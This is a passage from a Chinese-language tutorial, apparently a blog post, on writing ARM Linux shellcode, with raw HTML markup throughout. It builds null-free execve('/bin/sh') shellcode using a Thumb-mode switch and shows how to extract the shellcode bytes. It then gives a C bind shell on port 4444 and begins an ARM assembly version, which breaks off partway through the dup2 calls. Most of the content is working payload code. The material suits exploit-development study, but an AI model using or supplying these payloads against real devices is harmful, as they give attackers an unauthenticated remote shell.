class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Function&lt;/th&gt;
&lt;th&gt;R7&lt;/th&gt;
&lt;th&gt;R0&lt;/th&gt;
&lt;th&gt;R1&lt;/th&gt;
<p>
		

	

	</div>
  <a type="button" href="/2021/08/16/ARM Shellcode的编写/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>从write说起：</p>
<p>在linux中的原型为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在c语言中的使用方法如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">13</span>] = <span class="string">&quot;Hello world\n&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>, <span class="built_in">string</span>, <span class="keyword">sizeof</span>(<span class="built_in">string</span>));        <span class="comment">// Here sizeof(string) is 13</span></span><br></pre></td></tr></table></figure>

<p>把write的系统调用的汇编代码提取出来。如下：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x000270b0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="number">#96</span>] <span class="comment">; 0x27118</span></span><br><span class="line">   <span class="number">0x000270b4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="built_in">r12</span>]</span><br><span class="line">=&gt; <span class="number">0x000270b8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">teq</span> <span class="built_in">r12</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x000270bc</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">push</span> &#123;<span class="built_in">r7</span>&#125;  <span class="comment">; (str r7, [sp, #-4]!)</span></span><br><span class="line">   <span class="number">0x000270c0</span> &lt;+<span class="number">16</span>&gt;: <span class="keyword">bne</span> <span class="number">0x270dc</span> &lt;write+<span class="number">44</span>&gt;</span><br><span class="line">   <span class="number">0x000270c4</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#4</span></span><br><span class="line">   <span class="number">0x000270c8</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>

<p>fd, buf, count 分别保存在r0,r1,r2中，r7 存放着系统调用号，代表着write这个系统调用。</p>
<p>fd – 1 for STDOUT<br>buf – pointer to a string<br>count – number of bytes to write -&gt; 13<br>syscall number of write -&gt; 0x4</p>
<p>直接使用系统调用的方式：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="number">#1</span>      <span class="comment">@ fd 1 = STDOUT</span></span><br><span class="line"><span class="keyword">ldr</span>   <span class="built_in">r1</span>, string  <span class="comment">@ loading the string from memory to R1</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">r2</span>, <span class="number">#13</span>     <span class="comment">@ write 13 bytes to STDOUT </span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#4</span>      <span class="comment">@ Syscall 0x4 = write()</span></span><br><span class="line"><span class="keyword">svc</span>   <span class="number">#0</span></span><br></pre></td></tr></table></figure>

<h3 id="1-trace-system-call"><a href="#1-trace-system-call" class="headerlink" title="1.trace system call"></a>1.trace system call</h3><p>使用下面的简单例程，然后把它转化成汇编代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strace -f -v &lt;filename&gt;</span><br><span class="line"></span><br><span class="line">execve(&quot;/usr/bin/test&quot;, [&quot;test&quot;], [...]) = 0</span><br></pre></td></tr></table></figure>

<h3 id="2-system-call-number-and-parameters"><a href="#2-system-call-number-and-parameters" class="headerlink" title="2.system call number and parameters"></a>2.system call number and parameters</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">    execve - execute program</span><br><span class="line">SYNOPSIS</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span>  <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv [], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x000264d0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">push</span> &#123;<span class="built_in">r7</span>, <span class="built_in">lr</span>&#125;</span><br><span class="line">   <span class="number">0x000264d4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">   <span class="number">0x000264d8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br><span class="line">   <span class="number">0x000264dc</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">cmn</span> <span class="built_in">r0</span>, <span class="number">#4096</span> <span class="comment">; 0x1000</span></span><br><span class="line">   <span class="number">0x000264e0</span> &lt;+<span class="number">16</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r3</span>, <span class="built_in">r0</span></span><br><span class="line">   <span class="number">0x000264e4</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">bhi</span> <span class="number">0x264f0</span> &lt;execve+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x000264e8</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r3</span></span><br><span class="line">   <span class="number">0x000264ec</span> &lt;+<span class="number">28</span>&gt;: <span class="keyword">pop</span> &#123;<span class="built_in">r7</span>, <span class="built_in">pc</span>&#125;</span><br><span class="line">   <span class="number">0x000264f0</span> &lt;+<span class="number">32</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">pc</span>, <span class="number">#20</span>] <span class="comment">; 0x2650c &lt;execve+60&gt;</span></span><br><span class="line">   <span class="number">0x000264f4</span> &lt;+<span class="number">36</span>&gt;: <span class="keyword">rsb</span> <span class="built_in">r1</span>, <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x000264f8</span> &lt;+<span class="number">40</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">pc</span>, <span class="built_in">r2</span>]</span><br><span class="line">   <span class="number">0x000264fc</span> &lt;+<span class="number">44</span>&gt;: <span class="keyword">bl</span> <span class="number">0x11520</span> &lt;__aeabi_read_tp&gt;</span><br><span class="line">   <span class="number">0x00026500</span> &lt;+<span class="number">48</span>&gt;: <span class="keyword">mvn</span> <span class="built_in">r3</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x00026504</span> &lt;+<span class="number">52</span>&gt;: <span class="keyword">str</span> <span class="built_in">r1</span>, [<span class="built_in">r0</span>, <span class="built_in">r2</span>]</span><br><span class="line">   <span class="number">0x00026508</span> &lt;+<span class="number">56</span>&gt;: <span class="keyword">b</span> <span class="number">0x264e8</span> &lt;execve+<span class="number">24</span>&gt;</span><br><span class="line">   <span class="number">0x0002650c</span> &lt;+<span class="number">60</span>&gt;: <span class="keyword">andeq</span> <span class="built_in">r0</span>, <span class="built_in">r7</span>, <span class="built_in">r0</span>, <span class="keyword">asr</span> <span class="number">#31</span></span><br></pre></td></tr></table></figure>

<p>syscall为11</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#12</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">        <span class="keyword">svc</span> <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/sh\0&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">execve:</span>     file format elf32-littlearm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">Disassembly</span> of section <span class="meta">.text</span>:</span><br><span class="line"></span><br><span class="line"><span class="number">00010054</span> &lt;_start&gt;:</span><br><span class="line">   <span class="number">10054</span>: e28f000c <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#12</span></span><br><span class="line">   <span class="number">10058</span>: e3a01000 <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">1005</span>c: e3a02000 <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">10060</span>: e3a0700b <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">   <span class="number">10064</span>: ef000000 <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br><span class="line">   <span class="number">10068</span>: <span class="number">6</span>e69622f <span class="meta">.word</span> <span class="number">0x6e69622f</span></span><br><span class="line">   <span class="number">1006</span>c: <span class="number">0068732</span>f <span class="meta">.word</span> <span class="number">0x0068732f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还是有很多NULL字符在里头的。</p>
<h3 id="3-去除NULL字符数据"><a href="#3-去除NULL字符数据" class="headerlink" title="3. 去除NULL字符数据"></a>3. 去除NULL字符数据</h3><p>我们可以用来减少空字节出现在shell代码中的一种技术是使用拇指模式。使用拇指模式可以减少空字节的机会，因为拇指指令长2字节，而不是4字节。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">        <span class="meta">.code</span> <span class="number">32</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span></span><br><span class="line">        <span class="keyword">bx</span>  <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">.code</span> <span class="number">16</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#8</span></span><br><span class="line">        <span class="keyword">eor</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line">        <span class="keyword">eor</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">        <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r5</span>, <span class="built_in">r5</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/sh\0&quot;</span></span><br></pre></td></tr></table></figure>

<p>去空后，效果还是不错的。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10054</span>: e28f3001  <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span></span><br><span class="line"><span class="number">10058</span>: e12fff13  <span class="keyword">bx</span> <span class="built_in">r3</span></span><br><span class="line"><span class="number">1005</span>c: a002       <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#8</span> <span class="comment">; (adr r0, 10068 &lt;_start+0x14&gt;)</span></span><br><span class="line"><span class="number">1005</span>e: <span class="number">4049</span>       <span class="keyword">eors</span> <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"><span class="number">10060</span>: <span class="number">4052</span>       <span class="keyword">eors</span> <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"><span class="number">10062</span>: <span class="number">270</span>b       <span class="keyword">movs</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line"><span class="number">10064</span>: df01       <span class="keyword">svc</span> <span class="number">1</span></span><br><span class="line"><span class="number">10066</span>: <span class="number">1</span>c2d       <span class="keyword">adds</span> <span class="built_in">r5</span>, <span class="built_in">r5</span>, <span class="number">#0</span></span><br><span class="line"><span class="number">10068</span>: <span class="number">6</span>e69622f  <span class="meta">.word</span> <span class="number">0x6e69622f</span></span><br><span class="line"><span class="number">1006</span>c: <span class="number">0068732</span>f  <span class="meta">.word</span> <span class="number">0x0068732f</span></span><br></pre></td></tr></table></figure>

<p>提取shellcode：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objcopy -O binary execve3 execve3.bin </span><br></pre></td></tr></table></figure>

<h2 id="bind-shell-to-tcp"><a href="#bind-shell-to-tcp" class="headerlink" title="bind shell to tcp"></a>bind shell to tcp</h2><p>过程：</p>
<p>创建新的TCP套接字<br>绑定socket到本地端口<br>等待传入的连接<br>接受传入的连接<br>将STDIN STDOUT STDERR从客户端重定向到新创建的套接字<br>生成shell</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> host_sockid;    <span class="comment">// socket file descriptor </span></span><br><span class="line"><span class="keyword">int</span> client_sockid;  <span class="comment">// client file descriptor </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hostaddr</span>;</span>            <span class="comment">// server aka listen address</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">// Create new TCP socket </span></span><br><span class="line">    host_sockid = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize sockaddr struct to bind socket using it </span></span><br><span class="line">    hostaddr.sin_family = AF_INET;                  <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line">    hostaddr.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);                <span class="comment">// server port, converted to network byte order</span></span><br><span class="line">    hostaddr.sin_addr.s_addr = <span class="built_in">htonl</span>(INADDR_ANY);   <span class="comment">// listen to any address, converted to network byte order</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to IP/Port in sockaddr struct </span></span><br><span class="line">    <span class="built_in">bind</span>(host_sockid, (struct sockaddr*) &amp;hostaddr, <span class="built_in"><span class="keyword">sizeof</span></span>(hostaddr)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Listen for incoming connections </span></span><br><span class="line">    <span class="built_in">listen</span>(host_sockid, <span class="number">2</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Accept incoming connection </span></span><br><span class="line">    client_sockid = <span class="built_in">accept</span>(host_sockid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Duplicate file descriptors for STDIN, STDOUT and STDERR </span></span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">0</span>); </span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">1</span>); </span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">2</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute /bin/sh </span></span><br><span class="line">    <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="built_in">close</span>(host_sockid); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Function</th>
<th>R7</th>
<th>R0</th>
<th>R1</th>
<th>R2</th>
</tr>
</thead>
<tbody><tr>
<td>Socket</td>
<td>281</td>
<td>2</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>Bind</td>
<td>282</td>
<td>host_sockid</td>
<td>(struct sockaddr*) &amp;hostaddr</td>
<td>16</td>
</tr>
<tr>
<td>Listen</td>
<td>284</td>
<td>host_sockid</td>
<td>2</td>
<td>–</td>
</tr>
<tr>
<td>Accept</td>
<td>285</td>
<td>host_sockid</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>Dup2</td>
<td>63</td>
<td>client_sockid</td>
<td>0 / 1 / 2</td>
<td>–</td>
</tr>
<tr>
<td>Execve</td>
<td>11</td>
<td>“/bin/sh”</td>
<td>0</td>
<td>0</td>
</tr>
</tbody></table>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"><span class="symbol">    _start:</span></span><br><span class="line">    <span class="meta">.ARM</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>         <span class="comment">// switch to thumb mode </span></span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">.THUMB</span></span><br><span class="line"><span class="comment">// socket(2, 1, 0)</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">#2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#1</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>      <span class="comment">// set r2 to null</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#200</span>        <span class="comment">// r7 = 281 (socket)</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#81</span>         <span class="comment">// r7 value needs to be split </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>              <span class="comment">// r0 = host_sockid value</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">// save host_sockid in r4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bind(r0, &amp;sockaddr, 16)</span></span><br><span class="line">    <span class="keyword">adr</span>  <span class="built_in">r1</span>, struct_addr <span class="comment">// pointer to address, port</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#1</span>]    <span class="comment">// write 0 for AF_INET</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#4</span>]    <span class="comment">// replace 1 with 0 in x.1.1.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#5</span>]    <span class="comment">// replace 1 with 0 in 0.x.1.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#6</span>]    <span class="comment">// replace 1 with 0 in 0.0.x.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#7</span>]    <span class="comment">// replace 1 with 0 in 0.0.0.x</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#16</span>          <span class="comment">// struct address length</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#1</span>           <span class="comment">// r7 = 282 (bind) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// listen(sockfd, 0) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>           <span class="comment">// set r0 to saved host_sockid</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#2</span>        </span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#2</span>           <span class="comment">// r7 = 284 (listen syscall number) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>        </span><br><span class="line"></span><br><span class="line"><span class="comment">// accept(sockfd, NULL, NULL); </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>           <span class="comment">// set r0 to saved host_sockid</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>       <span class="comment">// set r1 to null</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>       <span class="comment">// set r2 to null</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#1</span>           <span class="comment">// r7 = 284+1 = 285 (accept syscall)</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>               <span class="comment">// r0 = client_sockid value</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>           <span class="comment">// save new client_sockid value to r4  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">cmp</span> r</span><br><span class="line"><span class="comment">// dup2(sockfd, 0) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#63</span>         <span class="comment">// r7 = 63 (dup2 syscall number) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid </span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>      <span class="comment">// r1 = 0 (stdin) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 1)</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid </span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 1 (stdout) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 2) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved 